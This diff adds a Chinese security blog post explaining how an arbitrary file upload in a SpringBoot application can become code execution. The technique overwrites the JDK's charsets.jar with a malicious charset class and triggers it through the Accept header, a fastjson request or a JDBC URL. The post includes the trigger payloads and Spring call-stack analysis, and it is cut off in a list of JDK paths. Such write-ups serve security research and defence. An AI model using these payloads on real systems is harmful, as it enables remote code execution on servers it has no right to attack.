@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="很多java环境下的程序，都是直接以一个jar包的形式运行的，当存在文件上传漏洞时，并不会直接解析jsp等模板文件。这种情况下大多数的解决方案都是上传到计划任务、ssh key等，比较依赖系统的运行环境，对网络联通性也有要求。以下是几种不依赖系统特性，在java层面，依靠任意文件写实现代码执行的方法。 覆盖charsets.jarjvm采用懒加载，没有用到的class，不会加载到内存中。可以通过替">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SpringBoot下的文件上传利用">
+<meta property="og:url" content="http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="之间太多空白">
+<meta property="og:description" content="很多java环境下的程序，都是直接以一个jar包的形式运行的，当存在文件上传漏洞时，并不会直接解析jsp等模板文件。这种情况下大多数的解决方案都是上传到计划任务、ssh key等，比较依赖系统的运行环境，对网络联通性也有要求。以下是几种不依赖系统特性，在java层面，依靠任意文件写实现代码执行的方法。 覆盖charsets.jarjvm采用懒加载，没有用到的class，不会加载到内存中。可以通过替">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/977968e11277c8302fea2847d4678b9a.png">
+<meta property="og:image" content="http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/5fad6775e64ba7bda7d3673beaedd242.png">
+<meta property="og:image" content="http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/c058eafc3178fdac5a6bef0b3d4cff6e.png">
+<meta property="og:image" content="http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/f67af86504280eada8b00916f59e3539.png">
+<meta property="og:image" content="http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/1235b48d08f986d1e1909637dc4d5521.png">
+<meta property="og:image" content="http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/1b2b97973510b5b17c4130c7f52d43eb.png">
+<meta property="og:image" content="http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/3eea74f0e8c8c024c5fbed0597dd4614.png">
+<meta property="og:image" content="http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/15b02af7d7e3ef172ef0f6ac892f1ccc.png">
+<meta property="og:image" content="http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/4d91ea73fde6c36ebe9c88f5f63b819d.png">
+<meta property="og:image" content="http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/d37ba6fe331e7ece93a760003f21553c.png">
+<meta property="og:image" content="http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/d08bfdb15eaed7655bc62c63afe55776.png">
+<meta property="og:image" content="http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/1acca61fc18e972a92df9499ddccb259.png">
+<meta property="og:image" content="http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/501be13f4fe6d53f3fff62950987b4a9.png">
+<meta property="og:image" content="http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/c46f3e3c9a105abc6bec62b712ed3685.png">
+<meta property="article:published_time" content="2024-05-02T11:13:51.000Z">
+<meta property="article:modified_time" content="2024-05-02T11:19:16.394Z">
+<meta property="article:author" content="yy">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/977968e11277c8302fea2847d4678b9a.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/logo.JPG">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/logo.JPG" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.JPG">
+        
+      
+    
+    <!-- title -->
+    <title>SpringBoot下的文件上传利用</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/yaoyao-cool">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/04/24/%E6%97%A0%E6%96%87%E4%BB%B6agent%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/&text=SpringBoot下的文件上传利用"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/&title=SpringBoot下的文件上传利用"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/&is_video=false&description=SpringBoot下的文件上传利用"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SpringBoot下的文件上传利用&body=Check out this article: http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/&title=SpringBoot下的文件上传利用"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/&title=SpringBoot下的文件上传利用"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/&title=SpringBoot下的文件上传利用"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/&title=SpringBoot下的文件上传利用"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/&name=SpringBoot下的文件上传利用&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://oh3r.vip/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/&t=SpringBoot下的文件上传利用"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A6%86%E7%9B%96charsets-jar"><span class="toc-number">1.</span> <span class="toc-text">覆盖charsets.jar</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Charset-forName"><span class="toc-number">1.1.1.</span> <span class="toc-text">Charset.forName</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#charsets-jar%E5%8C%85%E5%90%AB%E7%9A%84%E5%AD%97%E7%AC%A6%E9%9B%86"><span class="toc-number">1.1.2.</span> <span class="toc-text">charsets.jar包含的字符集</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0jar%E5%8C%85-%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">构造jar包 &amp;&amp; 利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E5%90%88fastjson%E4%B8%8B%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">结合fastjson下利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jdbc-url-getConnection"><span class="toc-number">1.4.</span> <span class="toc-text">jdbc url getConnection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81jdk%E7%9B%AE%E5%BD%95"><span class="toc-number">1.5.</span> <span class="toc-text">常见jdk目录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0SPI-class"><span class="toc-number">2.</span> <span class="toc-text">上传SPI class</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">2.1.</span> <span class="toc-text">利用</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        SpringBoot下的文件上传利用
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">yy</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-05-02T11:13:51.000Z" class="dt-published" itemprop="datePublished">2024-05-02</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/java/" rel="tag">java</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>很多java环境下的程序，都是直接以一个jar包的形式运行的，当存在文件上传漏洞时，并不会直接解析jsp等模板文件。<br>这种情况下大多数的解决方案都是上传到计划任务、ssh key等，比较依赖系统的运行环境，对网络联通性也有要求。<br>以下是几种不依赖系统特性，在java层面，依靠任意文件写实现代码执行的方法。</p>
+<h2 id="覆盖charsets-jar"><a href="#覆盖charsets-jar" class="headerlink" title="覆盖charsets.jar"></a>覆盖charsets.jar</h2><p>jvm采用懒加载，没有用到的class，不会加载到内存中。可以通过替换未加载的class所在的jar包，之后使其从上传的jar包中加载类。<br>上传时没办法上传到应用的jar中classpath中，但可以上传到JDK_HOME中。</p>
+<pre><code>注：windows下测试发现无法利用，无法覆盖已经打开的文件。
+</code></pre>
+<p>可以覆盖charsets.jar，构造恶意的字符集类，再通过指定http请求的字符集，触发上传的jar包<br>条件：</p>
+<ul>
+<li><p>需要可以上传charsets.jar到JDK_HOME目录下,一般需要root权限，linux下监听1024以下端口默认都需要root。</p>
+</li>
+<li><p>jdk 自带文件 <code>/jre/lib/***.jar</code> 没被 <code>Opened</code> 过</p>
+<ul>
+<li>以 charsets.jar 文件举例：程序代码中不使用 <code>Charset.forName(&quot;GBK&quot;)</code> 类似的调用，默认就不会 <code>Opened</code> charsets.jar 文件</li>
+<li>值得注意的是，只能主动触发一次 <code>Opened</code> .jar 文件，如果漏洞利用没有成功，则同名 jar 文件就不能再利用了</li>
+</ul>
+</li>
+</ul>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>springboot下，会解析Accept头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept: text/plain; charset=ibm33722</span><br></pre></td></tr></table></figure>
+<p>在<br><code>org.springframework.http.MediaType#parseMediaType</code>-&gt;<br><code>org.springframework.util.MimeTypeUtils#parseMimeTypeInternal</code></p>
+<p>如果存在key中有charset，会用<code>Charset.forName</code>加载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.util.MimeType#checkParameters</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/977968e11277c8302fea2847d4678b9a.png"></p>
+<h4 id="Charset-forName"><a href="#Charset-forName" class="headerlink" title="Charset.forName"></a>Charset.forName</h4><p>在执行<code>java.nio.charset.Charset#lookup2</code>到，会通过三个方法依次来加载</p>
+<ol>
+<li><code>sun.nio.cs.FastCharsetProvider#charsetForName</code> -&gt; rt.jar -&gt;sun.nio.cs</li>
+<li><code>sun.nio.cs.AbstractCharsetProvider#charsetForName</code> -&gt;charsets.jar -&gt; sun.nio.cs.ext</li>
+<li><code>java.nio.charset.Charset#lookupViaProviders</code> 利用spi机制，加载providers，利用spi发现的providers，加载字符集。<br>前两种可以加载的字符集是不同的，并且都是固定的。</li>
+</ol>
+<p>进入<code>sun.nio.cs.FastCharsetProvider#charsetForName</code>-&gt;<code>sun.nio.cs.FastCharsetProvider#lookup</code><br>使用class.forName加载class</p>
+<p><img src="/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/5fad6775e64ba7bda7d3673beaedd242.png"></p>
+<p>&#96;sun.nio.cs.AbstractCharsetProvider#charsetForName<br><img src="/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/c058eafc3178fdac5a6bef0b3d4cff6e.png"><br>会先检测缓存中有没有，如果没有才会继续加载，并且必须是classMap中存在的字符集。加载过一次后，会加入到缓存中。<br>缓存中不存在的，通过Class.forName加载。<br>这里就可以替换charsets.jar，通过accept头，来使spring加载其他未使用过的字符集。</p>
+<p>主要利用第二种加载方式，因为charsets.jar不包含任何核心的代码，相比于替换tr.jar,更稳定，并且文件更小。</p>
+<p>调用栈</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">lookup:98, FastCharsetProvider (sun.nio.cs)</span><br><span class="line">charsetForName:133, FastCharsetProvider (sun.nio.cs)</span><br><span class="line">lookup2:475, Charset (java.nio.charset)</span><br><span class="line">lookup:464, Charset (java.nio.charset)</span><br><span class="line">forName:528, Charset (java.nio.charset)</span><br><span class="line">checkParameters:235, MimeType (org.springframework.util)</span><br><span class="line">lambda$new$0:190, MimeType (org.springframework.util)</span><br><span class="line">accept:-1, 24872741 (org.springframework.util.MimeType$$Lambda$144)</span><br><span class="line">forEach:684, LinkedHashMap (java.util)</span><br><span class="line">&lt;init&gt;:189, MimeType (org.springframework.util)</span><br><span class="line">parseMimeTypeInternal:269, MimeTypeUtils (org.springframework.util)</span><br><span class="line">apply:-1, 118394766 (org.springframework.util.MimeTypeUtils$$Lambda$506)</span><br><span class="line">get:107, ConcurrentLruCache (org.springframework.util)</span><br><span class="line">parseMimeType:209, MimeTypeUtils (org.springframework.util)</span><br><span class="line">parseMediaType:631, MediaType (org.springframework.http)</span><br><span class="line">parseMediaTypes:660, MediaType (org.springframework.http)</span><br><span class="line">parseMediaTypes:685, MediaType (org.springframework.http)</span><br></pre></td></tr></table></figure>
+
+<h4 id="charsets-jar包含的字符集"><a href="#charsets-jar包含的字符集" class="headerlink" title="charsets.jar包含的字符集"></a>charsets.jar包含的字符集</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Big5=IBM33722, Big5-HKSCS=IBM33722, EUC-JP=IBM33722, EUC-KR=IBM33722, GB18030=IBM33722, GB2312=IBM33722, GBK=IBM33722, IBM-Thai=IBM33722, IBM01140=IBM33722, IBM01141=IBM33722, IBM01142=IBM33722, IBM01143=IBM33722, IBM01144=IBM33722, IBM01145=IBM33722, IBM01146=IBM33722, IBM01147=IBM33722, IBM01148=IBM33722, IBM01149=IBM33722, IBM037=IBM33722, IBM1026=IBM33722, IBM1047=IBM33722, IBM273=IBM33722, IBM277=IBM33722, IBM278=IBM33722, IBM280=IBM33722, IBM284=IBM33722, IBM285=IBM33722, IBM290=IBM33722, IBM297=IBM33722, IBM420=IBM33722, IBM424=IBM33722, IBM500=IBM33722, IBM860=IBM33722, IBM861=IBM33722, IBM863=IBM33722, IBM864=IBM33722, IBM865=IBM33722, IBM868=IBM33722, IBM869=IBM33722, IBM870=IBM33722, IBM871=IBM33722, IBM918=IBM33722, ISO-2022-CN=IBM33722, ISO-2022-JP=IBM33722, ISO-2022-JP-2=IBM33722, ISO-2022-KR=IBM33722, ISO-8859-3=IBM33722, ISO-8859-6=IBM33722, ISO-8859-8=IBM33722, JIS_X0201=IBM33722, JIS_X0212-1990=IBM33722, Shift_JIS=IBM33722, TIS-620=IBM33722, windows-1255=IBM33722, windows-1256=IBM33722, windows-1258=IBM33722, windows-31j=IBM33722, x-Big5-HKSCS-2001=IBM33722, x-Big5-Solaris=IBM33722, x-COMPOUND_TEXT=IBM33722, x-euc-jp-linux=IBM33722, x-EUC-TW=IBM33722, x-eucjp-open=IBM33722, x-IBM1006=IBM33722, x-IBM1025=IBM33722, x-IBM1046=IBM33722, x-IBM1097=IBM33722, x-IBM1098=IBM33722, x-IBM1112=IBM33722, x-IBM1122=IBM33722, x-IBM1123=IBM33722, x-IBM1124=IBM33722, x-IBM1166=IBM33722, x-IBM1364=IBM33722, x-IBM1381=IBM33722, x-IBM1383=IBM33722, x-IBM300=IBM33722, x-IBM33722=IBM33722, x-IBM833=IBM33722, x-IBM834=IBM33722, x-IBM856=IBM33722, x-IBM875=IBM33722, x-IBM921=IBM33722, x-IBM922=IBM33722, x-IBM930=IBM33722, x-IBM933=IBM33722, x-IBM935=IBM33722, x-IBM937=IBM33722, x-IBM939=IBM33722, x-IBM942=IBM33722, x-IBM942C=IBM33722, x-IBM943=IBM33722, x-IBM943C=IBM33722, x-IBM948=IBM33722, x-IBM949=IBM33722, x-IBM949C=IBM33722, x-IBM950=IBM33722, x-IBM964=IBM33722, x-IBM970=IBM33722, x-ISCII91=IBM33722, x-ISO-2022-CN-CNS=IBM33722, x-ISO-2022-CN-GB=IBM33722, x-ISO-8859-11=IBM33722, x-JIS0208=IBM33722, x-JISAutoDetect=IBM33722, x-Johab=IBM33722, x-MacArabic=IBM33722, x-MacCentralEurope=IBM33722, x-MacCroatian=IBM33722, x-MacCyrillic=IBM33722, x-MacDingbat=IBM33722, x-MacGreek=IBM33722, x-MacHebrew=IBM33722, x-MacIceland=IBM33722, x-MacRoman=IBM33722, x-MacRomania=IBM33722, x-MacSymbol=IBM33722, x-MacThai=IBM33722, x-MacTurkish=IBM33722, x-MacUkraine=IBM33722, x-MS932_0213=IBM33722, x-MS950-HKSCS=IBM33722, x-MS950-HKSCS-XP=IBM33722, x-mswin-936=IBM33722, x-PCK=IBM33722, x-SJIS_0213=IBM33722, x-windows-50220=IBM33722, x-windows-50221=IBM33722, x-windows-874=IBM33722, x-windows-949=IBM33722, x-windows-950=IBM33722, x-windows-iso2022jp=IBM33722</span><br></pre></td></tr></table></figure>
+
+<h3 id="构造jar包-利用"><a href="#构造jar包-利用" class="headerlink" title="构造jar包 &amp;&amp; 利用"></a>构造jar包 &amp;&amp; 利用</h3><p> 类名必须是 charsets.jar包含的字符集<br> 利用时，Accept头中的charset和类名都是对应字符集中的key</p>
+<p>jar包：<br><img src="/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/f67af86504280eada8b00916f59e3539.png"></p>
+<p>利用</p>
+<ol>
+<li>上传<br><img src="/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/1235b48d08f986d1e1909637dc4d5521.png"></li>
+<li>修改accept为类名对应的字符集<br><img src="/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/1b2b97973510b5b17c4130c7f52d43eb.png"><br>执行成功</li>
+</ol>
+<p><img src="/2024/05/02/SpringBoot%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%A9%E7%94%A8/3eea74f0e8c8c024c5fbed0597dd4614.png"></p>
+<h3 id="结合fastjson下利用"><a href="#结合fastjson下利用" class="headerlink" title="结合fastjson下利用"></a>结合fastjson下利用</h3><p>没有进一步分析，记录一下payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /fastjson HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;x&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.nio.charset.Charset&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;500&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="jdbc-url-getConnection"><a href="#jdbc-url-getConnection" class="headerlink" title="jdbc url getConnection"></a>jdbc url getConnection</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /jdbc?url=jdbc:mysql://127.0.0.1:3306/test?statementInterceptors=sun.nio.cs.ext.IBM33722</span><br></pre></td></tr></table></figure>
+
+<h3 id="常见jdk目录"><a href="#常见jdk目录" class="headerlink" title="常见jdk目录"></a>常见jdk目录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span 